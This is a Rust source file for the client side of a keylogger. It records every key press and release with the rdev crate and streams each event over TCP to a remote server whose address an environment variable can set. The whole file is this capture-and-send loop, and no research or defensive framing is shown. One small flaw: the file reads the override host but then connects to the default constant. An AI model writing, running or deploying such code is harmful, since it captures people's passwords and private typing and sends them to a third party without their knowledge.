use std::{io::Read, sync::mpsc};

use __core__::{KeyLogger, Message, HOST, PORT};
use tokio::net::{tcp::OwnedWriteHalf, TcpStream};

const TRACING_LEVEL: tracing::Level = tracing::Level::DEBUG;

struct Client;

impl Client {
    fn new() -> Self {
        use tracing_subscriber::fmt::format::FmtSpan;
        tracing_subscriber::fmt()
            .with_max_level(TRACING_LEVEL)
            .compact()
            .with_span_events(FmtSpan::FULL)
            .init();
        Self
    }

    async fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut host = HOST.to_string();

        if let Ok(env_host) = std::env::var("SERVER_HOST") {
            host = env_host.trim().to_string();
        }

        tracing::info!("Connecting to {}:{}", host, PORT);
        let socket = TcpStream::connect((HOST, PORT)).await?;
        tracing::info!("Connected");

        let (_, writer) = socket.into_split();

        let send_h = tokio::spawn(Self::handle_send(writer));

        send_h.await.unwrap();

        tracing::info!("Closed connection");
        Ok(())
    }

    async fn handle_send(mut writer: OwnedWriteHalf) {
        let (tx_key, rx_key) = mpsc::channel::<(rdev::Key, rdev::EventType)>();
        let key_logger = KeyLogger::new(tx_key);
        std::thread::spawn(move || key_logger.listen());

        loop {
            let (key, action) = rx_key.recv().unwrap();
            let message = Message::key(key, action);
            message.send(&mut writer).await.unwrap();
        }
    }
}

#[tokio::main]
async fn main() {
    let client = Client::new();
    if let Err(e) = client.run().await {
        tracing::error!("{}", e);
    }
}
